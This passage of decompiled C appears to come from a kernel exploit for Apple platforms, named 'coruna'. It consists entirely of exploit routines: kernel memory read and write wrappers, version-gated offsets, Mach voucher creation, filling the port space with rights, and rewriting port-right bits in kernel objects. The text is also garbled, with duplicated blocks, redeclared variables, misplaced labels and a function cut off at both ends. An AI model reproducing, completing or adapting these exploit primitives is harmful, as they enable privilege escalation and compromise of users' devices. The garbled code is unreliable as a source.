  long handle;
  int status;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if ((((err || err == status) && (err = coruna_kernel509_via_fn_ptr_cast_2_13(handle,val,&thread_attr), err == 0))
      && (err = coruna_kernel509_residual_307(handle,thread_attr + 0x10,&bootargs), err != 0)) &&
     (((handle = coruna_fn_ptr_cast_2(handle,bootargs), handle != 0 &&
       (err = coruna_kernel509_residual_307(handle,bootargs + 0x38,&scratch), err != 0)) &&
      (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)))) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_25(long handle,int flags,uint32_t *size)
{
  int err;
  
  if (flags == 0) {
    err = coruna_fn_ptr_cast_10(handle,8);
    if ((err == 0) && (0x225814018fffff < *(unsigned long *)(handle + 0x158))) {
      coruna_fn_ptr_cast_10(handle,0x2000);
    }
    *size = 6;
  }
  return;
}
void coruna_pthread_attr_setdetachstate(uint *size,uint flags_2,uint *count_3)
{
  long *ptr;
  unsigned long u;
  uint size;
  int err;
  uint *ptr;
  void **lppv6;
  long handle;
  unsigned long version;
  long addr;
  uint *scratch;
  uint bootargs;
  uint32_t thread_attr;
  pthread_t host_info;
  pthread_attr_t serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = size;
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(ptr);
}
void coruna_kernel509_via_helper_24c44_333dc(uint64_t val,uint64_t id_2,int flags)
{
  int err;
  long handle;
  uint scratch;
  
  handle = coruna_helper_24c44_333dc();
  if (((handle != 0) && (err = coruna_kernel509_via_mach_vm_read_overwrite(val,handle,&scratch), err != 0)) &&
     (scratch < 0x80000001)) {
    coruna_mach_vm_machine_attribute(val,handle,scratch + flags);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(uint64_t val,long handle,int flags)
{
  int err;
  int scratch;
  
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(val,handle + 4,4,&scratch);
  if (err != 0) {
    scratch = scratch + flags;
    coruna_call_mach_vm_machine_attribute_1d4f8_2b614(val,handle + 4,&scratch,4);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(uint64_t val,uint64_t id_2)
{
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(val,id_2,1);
  coruna_kernel509_via_helper_24c44_333dc(val,id_2,1);
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_2(long handle,long addr_2,int flags)
{
  int err;
  long handle;
  long scratch;
  int bootargs;
  
  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2 + 0x10,&bootargs);
  if (((((err != 0) && (bootargs - 1U >> 0x14 == 0)) &&
       (err = coruna_kernel509_via_fn_ptr_cast_10_13(handle,addr_2 + 0x10,bootargs + flags), err != 0)) &&
      ((0x1f530f027fffff < *(unsigned long *)(handle + 0x158) &&
       (err = coruna_kernel509_residual_307(handle,addr_2,&scratch), err != 0)))) &&
     (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)) {
    handle = 0;
    if (*(int *)(handle + 0x140) < 0x2712) {
      handle = 0x18;
    }
    err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + scratch,&bootargs);
    if ((err != 0) && (bootargs - 1U >> 0x14 == 0)) {
      coruna_mach_vm_machine_attribute(handle,scratch + handle,bootargs + flags);
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_mach_vm_read_overwrite_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_2(val,id_2,0x10);
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_3(uint64_t val,long handle)
{
  int err;
  int scratch;
  
  err = coruna_kernel509_via_mach_vm_read_overwrite(val,handle + 0x10,&scratch);
  if ((err != 0) && (scratch != 0)) {
    coruna_mach_vm_machine_attribute(val,handle + 0x10,scratch + 4);
  }
  return;
}
void coruna_ctx_set_flag(uint *size,uint flags_2)
{
  *size = *size | flags_2;
  return;
}
void coruna_ctx_clear_flag(uint *size,uint flags_2)
{
  *size = *size & (flags_2 ^ 0xffffffff);
  return;
}
void coruna_fn_ptr_cast_10(void)
{
  return;
}
void coruna_kernel509_via_vm_deallocate_2a1cc(long handle)
{
  int err;
  long handle;
  uint32_t scratch;
  long bootargs;
  
  bootargs = 0;
  if ((((*(long *)(handle + 0x210) == 0) && (*(long *)(&k_kernel_slot_19d0 + handle) != 0)) &&
      (handle = coruna_fn_ptr_cast_7(handle), handle != 0)) &&
     (err = coruna_kernel509_residual_307(handle,handle,&bootargs), err != 0)) {
    if (bootargs == 0) {
      scratch = 0x200;
      bootargs = coruna_vm_deallocate_2a1cc(handle,&scratch);
      if (bootargs == 0) {
        return;
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,handle,bootargs);
      if (err == 0) {
        return;
      }
    }
    else {
      handle = coruna_fn_ptr_cast_2(handle);
      if (handle == 0) {
        return;
      }
    }
    *(long *)(handle + 0x210) = bootargs;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc(long handle,uint size,long *addr_2)
{
  int err;
  long scratch;
  
  if (((size < 0xe) && (scratch = coruna_kernel509_via_vm_deallocate_2a1cc(), scratch != 0)) &&
     (err = coruna_kernel509_residual_307(handle,scratch + (unsigned long)(*(int *)(handle + 0x168) * size),&scratch
                          ), err != 0)) {
    *addr_2 = scratch;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc_2(long handle,uint size,uint64_t val)
{
  int err;
  long handle;
  uint64_t scratch;
  
  if (size < 0xe) {
    err = *(int *)(handle + 0x168);
    scratch = val;
    handle = coruna_kernel509_via_vm_deallocate_2a1cc();
    if (handle != 0) {
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + (unsigned long)(err * size),&scratch,err);
    }
  }
  return;
}
void coruna_host_create_mach_voucher(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  mach_port_t lm1;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_000437c8;
  scratch = k_kernel_rodata_word_437c0;
  bootargs = id_2;
  lm1 = _mach_host_self();
  _host_create_mach_voucher(lm1,&scratch,0x18,size_3);
  return;
}
void coruna_proc_pidinfo(uint64_t val,uint64_t id_2)
{
  pid_t pid;
  int err;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if ((uint)scratch < (uint)id_2) {
      coruna_mach_port_insert_right(id_2);
    }
  }
  else {
    ___error();
    ___error();
  }
  return;
}
void coruna_mach_port_insert_right(int flags)
{
  uint name;
  uint8_t *ptr;
  kern_return_t lk2;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    name = flags << 8 | 3;
    lk2 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,scratch,0x15);
    if (lk2 == 0) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,name);
    }
  }
  if (1 < scratch + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  }
  return;
}
void coruna_proc_pidinfo_28ba4(uint64_t val,uint size)
{
  pid_t pid;
  int err;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if (scratch < size) {
      coruna_mach_port_insert_right((size - scratch) + (int)scratch);
    }
  }
  else {
    ___error();
    ___error();
  }
  return;
}
void coruna_mach_port_request_notification(long handle,long addr_2,mach_port_name_t *arg)
{
  ipc_space_t task;
  uint u;
  uint8_t *ptr;
  mach_port_t poly;
  bool err;
  int err;
  uint size;
  kern_return_t lk6;
  int status;
  uint version;
  uint64_t port;
  long handle;
  long addr;
  mach_port_name_t lm12;
  uint tag;
  uint scratch;
  long bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  vm_address_t action;
  
  action = action & 0xffffffff00000000;
  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2,&action);
  tag = 0x2800f;
  if (err == 0) {
    return;
  }
  if (-1 < (int)(uint)action) {
    return;
  }
  if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
    version = 0x200000;
    if (*(unsigned long *)(handle + 0x158) < 0x1f541900000000) {
      version = 0x400000;
    }
    port = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2 + 8,&action);
    if ((int)port == 0) {
      return;
    }
    if ((((uint)action & version) != 0) &&
       (port = coruna_mach_vm_machine_attribute(handle,addr_2 + 8,(uint)action & (version ^ 0xffffffff)),
       (int)port == 0)) {
      return;
    }
    if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
      serial_buf = 0;
      thread_attr = 0;
      scratch = 0;
      action = 0;
      err = coruna_proc_pidinfo_28ba4(port,8);
      ptr = k_kernel_mach_task_self_slot;
      if (err != 0) {
        return;
      }
      handle = coruna_mach_ports_register(handle,*(uint32_t *)k_kernel_mach_task_self_slot,&bootargs,
                            (long)&serial_buf + 4);
      if (handle == 0) {
        return;
      }
      version = serial_buf * (uint)bootargs;
      size = _vm_allocate(*(vm_map_t *)ptr,&action,(unsigned long)version,1);
      if (size == 0) {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,serial_buf * (uint)bootargs,action);
        if (err == 0) {
          lm12 = 0;
        }
        else {
          if ((uint)bootargs != 0) {
            size = 0;
            do {
              host_info = 0;
              handle = action + serial_buf * size;
              ___memcpy_chk(&host_info,handle,(long)*(int *)(handle + 0x168),8);
              if (((host_info != 0) && (host_info = coruna_kernel509_via_fn_ptr_cast_10_10(handle), host_info == addr_2)) &&
                 (u = *(uint *)(handle + *(int *)(handle + 0x168)), (u >> 0x10 & 1) != 0))
              {
                tag = 0;
                lm12 = (mach_port_name_t)(coruna_u64_pack((size), (u)) >> 0x18);
                if ((action != 0) && (version != 0)) {
                _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
                }
                if (tag != 0) {
                return;
                }
                if (1 < lm12 + 1) {
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
                if (lk6 != 0) {
                return;
                }
                *arg = lm12;
                return;
                }
                lk6 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
                if (lk6 != 0) {
                return;
                }
                handle = coruna_call_helper_25fa0(handle,(mach_port_name_t)serial_buf);
                if (handle == 0) {
                return;
                }
                addr = coruna_fn_ptr_cast_6(handle,handle);
                if (addr == 0) {
                return;
                }
                err = *(int *)(handle + 0x168);
                status = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2,&scratch);
                if (status == 0) {
                return;
                }
                if (((scratch >> 10 & 1) != 0) &&
                (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) {
                return;
                }
                err = coruna_kernel509_residual_308(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) + err * 2),
                addr_2);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_request_notification
                (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                (mach_port_t *)((long)&thread_attr + 4));
                if (lk6 != 0) {
                return;
                }
                if (thread_attr + 1 < 2) {
                return;
                }
                err = coruna_proc_pidinfo_28ba4(0,8);
                if (err != 0) {
                return;
                }
                handle = coruna_call_helper_25ed0(handle,thread_attr);
                if (handle == 0) {
                return;
                }
                err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x40000) {
                return;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
                if (lk6 != 0) {
                return;
                }
                tag = 0;
                task = *(ipc_space_t *)ptr;
                poly = thread_attr;
                while( true ) {
                action = action & 0xffffffff00000000;
                lk6 = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (lk6 != 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (lk6 != 0) {
                return;
                }
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) break;
                err = 7 < tag;
                tag = tag + 1;
                if ((version & 0xfffffff7) != 5 || err) {
                return;
                }
                }
                lm12 = (uint)action;
                if ((scratch >> 10 & 1) != 0) {
                coruna_mach_vm_machine_attribute(handle,addr_2);
                }
                handle = coruna_call_helper_25ed0(handle,thread_attr);
                if (handle == 0) {
                return;
                }
                err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                return;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return;
                }
                lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                if (lk6 != 0) {
                return;
                }
                *arg = lm12;
                return;
              }
              size = size + 1;
            } while (size < (uint)bootargs);
          }
          lm12 = 0;
          tag = 0;
        }
      }
      else {
        lm12 = 0;
        tag = size | 0x80000000;
      }
fail:
      if ((action != 0) && (version != 0)) {
        _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
      }
      if (tag != 0) {
        return;
      }
      if (1 < lm12 + 1) {
        lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
        if (lk6 != 0) {
          return;
        }
        *arg = lm12;
        return;
      }
      lk6 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
      if (lk6 != 0) {
        return;
      }
      handle = coruna_call_helper_25fa0(handle,(mach_port_name_t)serial_buf);
      if (handle == 0) {
        return;
      }
      addr = coruna_fn_ptr_cast_6(handle,handle);
      if (addr == 0) {
        return;
      }
      err = *(int *)(handle + 0x168);
      status = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr_2,&scratch);
      if (status == 0) {
        return;
      }
      if (((scratch >> 10 & 1) != 0) &&
         (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) {
        return;
      }
      err = coruna_kernel509_residual_308(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) + err * 2),
                           addr_2);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_request_notification
                        (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                         (mach_port_t *)((long)&thread_attr + 4));
      if (lk6 != 0) {
        return;
      }
      if (thread_attr + 1 < 2) {
        return;
      }
      err = coruna_proc_pidinfo_28ba4(0,8);
      if (err != 0) {
        return;
      }
      handle = coruna_call_helper_25ed0(handle,thread_attr);
      if (handle == 0) {
        return;
      }
      err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
      if (err == 0) {
        return;
      }
      if (((uint)thread_attr & 0x1f0000) != 0x40000) {
        return;
      }
      thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
      err = coruna_mach_vm_machine_attribute(handle,handle + 8);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
      if (lk6 != 0) {
        return;
      }
      tag = 0;
      task = *(ipc_space_t *)ptr;
      poly = thread_attr;
      while( true ) {
        action = action & 0xffffffff00000000;
        lk6 = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
        if (lk6 != 0) {
          return;
        }
        lk6 = _mach_port_mod_refs(task,(uint)action,1,-1);
        if (lk6 != 0) {
          return;
        }
        version = _mach_port_insert_right(task,(uint)action,poly,0x13);
        if (version == 0) break;
        err = 7 < tag;
        tag = tag + 1;
        if ((version & 0xfffffff7) != 5 || err) {
          return;
        }
      }
      lm12 = (uint)action;
      if ((scratch >> 10 & 1) != 0) {
        coruna_mach_vm_machine_attribute(handle,addr_2);
      }
      handle = coruna_call_helper_25ed0(handle,thread_attr);
      if (handle == 0) {
        return;
      }
      err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 8,&thread_attr);
      if (err == 0) {
        return;
      }
      if (((uint)thread_attr & 0x1f0000) != 0x10000) {
        return;
      }
      thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
      err = coruna_mach_vm_machine_attribute(handle,handle + 8);
      if (err == 0) {
        return;
      }
      lk6 = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
      if (lk6 != 0) {
        return;
      }
      *arg = lm12;
      return;
    }
  }
  serial_buf = 0;
  err = *(int *)(handle + 0x140);
  handle = 0x38;
  if (err < 0x1f53) {
    if ((err != 0x1809) && (err != 0x1c1b)) {
      return;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return;
    }
    handle = 0x30;
  }
  _arc4random_buf(&host_info,8);
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  err = coruna_host_create_mach_voucher();
  if (err == 0) {
done:
    err = false;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return;
  }
  addr = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,serial_buf);
  if (addr == 0) {
    err = false;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return;
  }
  addr = addr + handle;
  err = coruna_kernel509_residual_307(handle,addr,&action);
  err = false;
  if (1 < serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
  }
  if (err) {
  *arg = (mach_port_name_t)serial_buf;
  }
  else if (1 < (mach_port_name_t)serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
  }
  return;
}
void coruna_mach_port_destroy(long handle,uint size)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  long scratch;
  long bootargs;
  uint64_t thread_attr;
  void *host_info;
  long serial_buf;
  
  thread_attr = 0;
  host_info = (void *)0x0;
  scratch = 0;
  bootargs = 0;
  if (*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) {
    u = *(uint *)(handle + 0x180);
    if (*(uint *)(handle + 0x180) <= size) {
      u = size;
    }
    serial_buf = 0;
    ptr = _calloc((unsigned long)u,1);
    if (ptr != (void *)0x0) {
      err = coruna_kernel5_residual_231(u << 1,&serial_buf);
      if ((((err == 0) && (err = coruna_kernel5_residual_232(serial_buf,0x1000000,4,0), err == 0)) &&
          (err = coruna_kernel5_residual_232(serial_buf,0x8000000,4,"key"), err == 0)) &&
         (err = coruna_kernel5_residual_232(serial_buf,0x8a000000,(unsigned long)u,ptr), err == 0)) {
        err = coruna_kernel5_residual_233(serial_buf,&host_info,(long)&thread_attr + 4);
      }
      if (serial_buf != 0) {
        coruna_kernel5_residual_234();
      }
      _free(ptr);
      if (err == 0) {
        size = coruna_ioservice_publish_25d44(host_info,thread_attr,&thread_attr);
        u = (mach_port_name_t)size + 1;
        if (((((1 < u) && (bootargs = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,size), bootargs != 0)) &&
             ((err = coruna_kernel509_residual_307(handle,bootargs + 0x10,&bootargs), err != 0 &&
              ((err = coruna_kernel509_residual_307(handle,bootargs + 0x18,&bootargs), err != 0 &&
               (err = coruna_kernel509_residual_307(handle,bootargs + 0x20,&bootargs), err != 0)))))) &&
            (err = coruna_kernel509_residual_307(handle,bootargs + *(int *)(handle + 0x168),&bootargs),
            err != 0)) &&
           (((err = coruna_kernel509_residual_307(handle,bootargs + 0x18,&scratch), err != 0 &&
             (scratch = coruna_fn_ptr_cast_2(handle,scratch), scratch != 0)) &&
            (err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,bootargs + 0x18,0), err == 0)))) {
          scratch = 0;
        }
        if (host_info != (void *)0x0) {
          _free(host_info);
        }
        if (1 < u) {
          _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)size);
        }
        if (1 < (mach_port_name_t)thread_attr + 1) {
          _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,
                             (mach_port_name_t)thread_attr);
        }
      }
    }
  }
  return;
}
void coruna_mach_port_allocate(long handle,long addr_2,unsigned long arg)
{
  pthread_mutex_t *ptr;
  uint64_t *ptr;
  uint u;
  mach_port_name_t name;
  uint size;
  uint8_t *buf;
  kern_return_t lk6;
  int err;
  ipc_space_t task;
  long handle;
  mach_port_name_t lm9;
  unsigned long version;
  uint64_t *str;
  uint64_t *copy;
  void *ptr;
  uint port;
  uint64_t tag;
  uint64_t kind;
  mach_port_name_t scratch;
  vm_address_t bootargs [3];
  
  buf = k_kernel_mach_task_self_slot;
  port = (uint)arg;
  if (*(unsigned long *)(handle + 0x158) < 0x1f541e00000000) {
    scratch = 0;
    lk6 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
    lm9 = scratch;
    if (lk6 != 0) {
      return;
    }
    err = coruna_kernel5_residual_246(bootargs);
    if (err == 0) {
      err = coruna_kernel509_via_kernel5_residual_249(bootargs,0xffffffff);
      if (err == 0) {
        err = coruna_mach_msg(bootargs,0,lm9,0);
        coruna_kernel5_residual_247(bootargs);
        if (err == 0) {
          bootargs[0] = coruna_u64_pack71((bootargs[0]), (2));
          u = *(uint *)(handle + 0x168);
          size = 0;
          if (u != 0) {
            size = port / u;
          }
          if (((port == size * u) && (handle = coruna_kernel509_via_kernel509_via_kernel509_via_helper_24abc_36410(handle,scratch), handle != 0)) &&
             (ptr = _calloc(arg & 0xffffffff,1), ptr != (void *)0x0)) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,addr_2,ptr,arg);
            _free(ptr);
            if ((err != 0) && (err = coruna_kernel509_residual_308(handle,handle + 0x24,addr_2), err != 0)) {
              u = 0;
              if (*(uint *)(handle + 0x168) != 0) {
                u = port / *(uint *)(handle + 0x168);
              }
              err = coruna_mach_vm_machine_attribute(handle,handle + 0x30,u);
              if (err != 0) {
                coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + 0x2f,bootargs,1);
              }
            }
          }
        }
      }
      else {
        coruna_kernel5_residual_247(bootargs);
      }
    }
    task = *(ipc_space_t *)buf;
    lm9 = scratch;
    _mach_port_mod_refs(task,lm9,1,-1);
    return;
  }
  bootargs[0] = 0;
  if ((arg & 0xf) != 0) {
    return;
  }
  lk6 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,bootargs,arg & 0xffffffff,1);
  if (lk6 == 0) {
    ptr = (pthread_mutex_t *)(handle + 0x330);
    err = _pthread_mutex_lock(ptr);
    if (err == 0) {
      if (*(void **)(handle + 0x370) != (void *)0x0) {
        str = (uint64_t *)0x0;
        copy = *(void **)(handle + 0x370);
        do {
          if ((copy[1] == addr_2) && (*(uint *)(copy + 3) == port)) {
            ptr = (uint64_t *)(handle + 0x370);
            if (str != (uint64_t *)0x0) {
              ptr = str;
            }
            *ptr = *copy;
            err = _pthread_mutex_unlock(ptr);
            lm9 = 0;
            }
            else {
            lm9 = 0;
            }
            cleanup:
            if (bootargs[0] != 0) {
            _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
            }
            if (lm9 + 1 < 2) {
            return;
          }
          ptr = (void *)*copy;
          str = copy;
          copy = ptr;
        } while (ptr != (void *)0x0);
      }
      err = _pthread_mutex_unlock(ptr);
      if (err == 0) {
        lm9 = 0;
        if (bootargs[0] != 0) {
        _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
        }
        if (lm9 + 1 < 2) {
        return;
        }
        task = *(ipc_space_t *)buf;
        _mach_port_mod_refs(task,lm9,1,-1);
        return;
      }
    }
done:
    lm9 = 0;
  }
  else {
    lm9 = 0;
  }
cleanup:
  if (bootargs[0] != 0) {
    _vm_deallocate(*(vm_map_t *)buf,bootargs[0],arg & 0xffffffff);
  }
  if (lm9 + 1 < 2) {
    return;
  }
  task = *(ipc_space_t *)buf;
fail:
  _mach_port_mod_refs(task,lm9,1,-1);
  return;
}
void coruna_mach_port_request_notification_29a50(long handle,uint *size)
{
  pthread_mutex_t *ptr;
  int err;
  uint u;
  uint size;
  uint8_t *ptr;
  uint64_t *buf;
  uint version;
  kern_return_t lk8;
  int status;
  ipc_space_t task;
  void *ptr;
  long handle;
  long addr;
  uint64_t port;
  uint64_t *str;
  mach_port_name_t name;
  int flags;
  unsigned long tag;
  uint64_t *copy;
  long off;
  size_t ls19;
  uint kind;
  unsigned long type_id;
  uint32_t scratch;
  uint bootargs;
  uint64_t thread_attr;
  mach_port_t host_info;
  uint64_t serial_buf;
  long action [3];
  
  ptr = k_kernel_mach_task_self_slot;
  kind = *size;
  tag = *(unsigned long *)(handle + 0x158);
  if (0x1f541dffffffff < tag) {
    serial_buf = 0;
    host_info = 0;
    thread_attr = 0;
    if ((tag < 0x22580a06c00000) &&
       ((tag < 0x1f543c40800000 || (0x2257 < *(int *)(handle + 0x140))))) {
      tag = 0;
      type_id = (unsigned long)*(uint *)(handle + 0x168);
    }
    else {
      type_id = 0;
      tag = (unsigned long)*(uint *)(handle + 0x168);
    }
    lk8 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,
                                (mach_port_name_t *)((long)&serial_buf + 4));
    if (lk8 == 0) {
      handle = coruna_call_helper_25fa0(handle,serial_buf);
      if ((((handle != 0) && (handle = coruna_fn_ptr_cast_6(handle,handle), handle != 0)) &&
          (handle = handle + (long)*(int *)(handle + 0x168) * 3, handle != 0)) &&
         (lk8 = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf),
         lk8 == 0)) {
        while( true ) {
          lk8 = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,serial_buf,0x48,0,(mach_port_name_t)serial_buf
                             ,0x15,&host_info);
          if (lk8 != 0) break;
          lk8 = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,serial_buf,0x48,0,0,0x15,&host_info);
          if (lk8 != 0) break;
          if (1 < host_info + 1) {
            lk8 = _mach_port_deallocate(*(ipc_space_t *)ptr,host_info);
            if (lk8 != 0) break;
            host_info = 0;
          }
          status = coruna_kernel509_via_mach_vm_read_overwrite_2(handle,handle,action);
          if (status == 0) break;
          off = coruna_kernel509_via_fn_ptr_cast_10_9(handle,action[0]);
          if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
            off = coruna_kernel509_via_fn_ptr_cast_10_12(handle,off,&bootargs);
          }
          addr = coruna_fn_ptr_cast_2(handle,off);
          if (addr == 0) break;
          version = bootargs;
          if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
            status = coruna_kernel509_via_mach_vm_read_overwrite_2(handle,off + type_id,&thread_attr);
            if (status == 0) break;
            port = coruna_kernel509_via_fn_ptr_cast_10_9(handle,thread_attr);
            addr = coruna_kernel5_residual_225(handle,port);
            if ((addr == 0) || (status = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,port,4,&bootargs), status == 0))
            break;
          }
          if (kind <= version) {
            status = coruna_kernel509_residual_308(handle,handle,0);
            if ((status != 0) && (str = _malloc(0x28), str != (uint64_t *)0x0)) {
              *str = 0;
              str[1] = off;
              str[2] = action[0];
              *(uint *)(str + 3) = version;
              *(mach_port_name_t *)((long)str + 0x1c) = serial_buf;
              str[4] = thread_attr;
              serial_buf = serial_buf & 0xffffffff;
              ptr = (pthread_mutex_t *)(handle + 0x330);
              status = _pthread_mutex_lock(ptr);
              _free(str);
              off = 0;
              version = kind;
              if (1 < serial_buf + 1) {
              _mach_port_mod_refs(*(ipc_space_t *)ptr,serial_buf,1,-1);
              }
              kind = version;
              if ((off != 0) && (kind != *size)) {
              *size = kind;
              }
              return;
            }
            break;
          }
          scratch = 0;
          status = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,off + tag,&scratch,4);
          if (status == 0) break;
        }
      }
    }
check_ok:
    off = 0;
    version = kind;
    if (1 < serial_buf + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,serial_buf,1,-1);
    }
    kind = version;
    if ((off != 0) && (kind != *size)) {
    *size = kind;
    }
    return;
  }
  version = coruna_helper_12310_40910(handle);
  ptr = k_kernel_mach_task_self_slot;
